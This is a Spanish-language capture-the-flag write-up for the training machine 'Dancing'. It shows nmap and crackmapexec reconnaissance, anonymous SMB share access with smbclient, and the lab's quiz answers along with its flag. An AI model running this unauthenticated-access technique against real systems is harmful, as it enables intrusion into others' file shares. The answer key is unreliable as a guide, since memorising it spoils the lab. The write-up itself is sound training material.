# Dancing

Comprobamos la conexion con 
```bash
ping 10.129.40.191
```

Comprobamos los puertos abiertos con Nmap
```bash
nmap -O -sCV -p- 10.129.40.191
```
Salida:
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?

Estamos ante un dispositivo Windows con el protocolo SMB.

Comprobamos al versión con crackmapexec:
```
crackmapexec smb 10.129.40.191

SMB         10.129.40.191   445    DANCING          [*] Windows 10 / Server 2019 Build 17763 x64 (name:DANCING) (domain:Dancing) (signing:False) (SMBv1:False)
```
La versión parece no ser vulnerable.

Comprobamos si permite null-sessions (aceso sin autenticación)

```
smbclient -L //<IP> -N
smbclient //<IP>/WorkShares -N
```

Podemos acceder sin el uso de credenciales. Vamos a comprobar el contenido
![[Dancing-smbclient.png]]

```
cat worknotes.txt 
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

```
cat flag.txt 
5f61c10dffbc77a704d76016a22f1664
```

--- 

>[!Question] What does the 3-letter acronym SMB stand for? 
>Server Message Block

 SMB (Server Message Block)** es un protocolo de red de capa de aplicación, fundamentalmente utilizado en entornos Windows para compartir archivos, impresoras, puertos serie y comunicaciones entre nodos de una red


>[!Question] What port does SMB use to operate at? 
> 445

>[!Question] What is the service name for port 445 that came up in our Nmap scan? 
> microsoft-ds

>[!Question] What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
> -L

>[!Question] How many shares are there on Dancing?
>4

From the enumeration results, the following shares were identified:
- `ADMIN$`
- `C$`
- `IPC$`
- `WorkShares`
**Total shares discovered: 4**


>[!Question] What is the name of the share we are able to access in the end with a blank password?
> WorkShares

>[!Question] What is the command we can use within the SMB shell to download the files we find?
> get

>[!Question] Submit root flag
> 5f61c10dffbc77a704d76016a22f1664

